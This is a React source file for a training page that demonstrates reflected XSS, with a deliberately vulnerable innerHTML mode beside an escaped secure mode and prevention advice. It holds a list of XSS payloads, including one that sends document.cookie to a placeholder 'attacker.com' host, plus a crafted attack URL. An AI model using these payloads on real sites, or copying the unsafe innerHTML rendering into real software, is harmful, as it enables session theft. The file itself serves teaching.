/**
 * REFLECTED XSS DEMO
 * ==================
 * User input is immediately reflected back in the response without storage.
 * In vulnerable mode, the reflected value is rendered via innerHTML.
 * In secure mode, textContent is used and input is validated.
 */

import { useState, useEffect, useRef } from 'react';
import { RefreshCw, Shield, ShieldOff, Search } from 'lucide-react';
import SectionHeader from '../components/SectionHeader';
import AlertBanner from '../components/AlertBanner';
import PayloadChip from '../components/PayloadChip';
import { detectXSS, logAttack } from '../lib/attackDetection';

const XSS_PAYLOADS = [
  '<script>alert("Reflected XSS")</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  '<svg/onload=alert(1)>',
  '<body onload=alert("pwned")>',
  'javascript:alert(1)',
  '\'><script>fetch("http://attacker.com?c="+document.cookie)</script>',
];

interface Alert { type: 'danger' | 'success' | 'info' | 'warning'; title: string; message: string }

function UnsafeReflection({ html }: { html: string }) {
  const ref = useRef<HTMLSpanElement>(null);
  useEffect(() => {
    if (ref.current) ref.current.innerHTML = html;
  }, [html]);
  return <span ref={ref} className="text-white" />;
}

export default function ReflectedXSS() {
  const [mode, setMode] = useState<'vulnerable' | 'secure'>('vulnerable');
  const [query, setQuery] = useState('');
  const [reflected, setReflected] = useState('');
  const [alert, setAlert] = useState<Alert | null>(null);

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    setAlert(null);

    const xss = detectXSS(query);

    if (mode === 'secure') {
      if (xss) {
        await logAttack({
          attackType: 'XSS_REFLECTED',
          payload: query,
          details: 'Reflected XSS attempt blocked by input validation. Output escaped.',
        });
        setAlert({ type: 'warning', title: 'Attack Blocked — Reflected XSS', message: 'XSS payload detected and sanitized. Input is escaped before being reflected.' });
        // In secure mode we still show the search but escape the output
        setReflected(`__SAFE__${query}`);
      } else {
        setReflected(`__SAFE__${query}`);
        setAlert({ type: 'info', title: 'Search Reflected Safely', message: `Query "${query}" was reflected using safe text rendering. No script execution possible.` });
      }
    } else {
      if (xss) {
        await logAttack({
          attackType: 'XSS_REFLECTED',
          payload: query,
          details: `Reflected XSS payload in search: ${query}. Rendered via innerHTML — script will execute in victim browser.`,
        });
        setAlert({ type: 'danger', title: 'ATTACK DETECTED — Reflected XSS', message: `XSS payload reflected via innerHTML. In a real app, sharing this URL would attack anyone who clicks it. Attack logged.` });
      } else {
        setAlert({ type: 'info', title: 'Search Reflected', message: `Query reflected back. Try an XSS payload.` });
      }
      setReflected(`__UNSAFE__${query}`);
    }
  };

  return (
    <div className="max-w-5xl mx-auto px-6 py-10">
      <SectionHeader
        icon={<RefreshCw size={20} className="text-white" />}
        title="Reflected XSS"
        subtitle="User input reflected in the response immediately — commonly exploited via crafted URLs"
        badge="VULNERABILITY DEMO"
        badgeColor="bg-yellow-700"
      />

      <div className="flex gap-3 mb-6">
        <button onClick={() => setMode('vulnerable')} className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all border ${mode === 'vulnerable' ? 'bg-red-900/40 border-red-600/60 text-red-300' : 'bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-600'}`}>
          <ShieldOff size={15} /> Vulnerable (innerHTML)
        </button>
        <button onClick={() => setMode('secure')} className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all border ${mode === 'secure' ? 'bg-emerald-900/40 border-emerald-600/60 text-emerald-300' : 'bg-gray-900 border-gray-700 text-gray-400 hover:border-gray-600'}`}>
          <Shield size={15} /> Secure (escaped output)
        </button>
      </div>

      <div className="grid lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-5">
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-6">
            <h3 className="text-sm font-semibold text-white mb-4">Search</h3>
            {alert && <div className="mb-4"><AlertBanner {...alert} onClose={() => setAlert(null)} /></div>}

            <form onSubmit={handleSearch} className="flex gap-2 mb-5">
              <input
                type="text"
                value={query}
                onChange={e => setQuery(e.target.value)}
                placeholder="Enter search query..."
                className="flex-1 bg-gray-800 border border-gray-700 rounded-lg px-3 py-2.5 text-white placeholder-gray-500 text-sm focus:outline-none focus:border-yellow-500 font-mono"
              />
              <button type="submit" className="bg-yellow-600 hover:bg-yellow-700 text-white px-4 py-2.5 rounded-lg text-sm font-semibold flex items-center gap-2 transition-colors">
                <Search size={15} /> Search
              </button>
            </form>

            {/* Reflection panel */}
            {reflected && (
              <div className="bg-gray-950 border border-gray-700 rounded-lg p-4">
                <p className="text-xs text-gray-500 mb-2">
                  {reflected.startsWith('__UNSAFE__')
                    ? 'You searched for (rendered via innerHTML — UNSAFE):'
                    : 'You searched for (escaped text — SAFE):'}
                </p>
                <div className="text-sm">
                  {reflected.startsWith('__UNSAFE__') ? (
                    <UnsafeReflection html={reflected.replace('__UNSAFE__', '')} />
                  ) : (
                    <span className="text-white font-mono break-all">{reflected.replace('__SAFE__', '')}</span>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* URL simulation */}
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
            <h3 className="text-sm font-semibold text-white mb-2">Attacker URL Example</h3>
            <p className="text-xs text-gray-400 mb-3">
              Reflected XSS is often delivered via a crafted URL. The victim clicks the link and the payload executes in their browser:
            </p>
            <div className="bg-gray-950 rounded-lg p-3 font-mono text-xs text-red-400 break-all">
              https://vulnerable-site.com/search?q=
              <span className="text-yellow-400">%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</span>
            </div>
            <p className="text-xs text-gray-500 mt-2">The URL-encoded payload decodes to: <code className="font-mono text-red-400">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
          </div>
        </div>

        <div className="space-y-5">
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
            <h3 className="text-sm font-semibold text-white mb-2">XSS Payloads</h3>
            <div className="flex flex-col gap-1.5">
              {XSS_PAYLOADS.map(p => (
                <PayloadChip key={p} payload={p} onClick={v => setQuery(v)} />
              ))}
            </div>
          </div>

          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5 space-y-4 text-xs text-gray-400 leading-relaxed">
            <div>
              <p className="font-bold text-yellow-400 uppercase mb-1">Attack</p>
              <p>The server reflects user input directly in the HTML response. Unlike Stored XSS, the payload isn't saved — it's delivered through a crafted URL sent to the victim.</p>
            </div>
            <div>
              <p className="font-bold text-emerald-400 uppercase mb-1">Detection</p>
              <p>Scan reflected parameters for HTML/script patterns before rendering. Log all detected attempts with the full payload.</p>
            </div>
            <div>
              <p className="font-bold text-blue-400 uppercase mb-1">Prevention</p>
              <p>HTML-encode all reflected output. Never use innerHTML with user data. Set <code className="font-mono text-gray-300">X-XSS-Protection</code> headers and a strict CSP policy.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
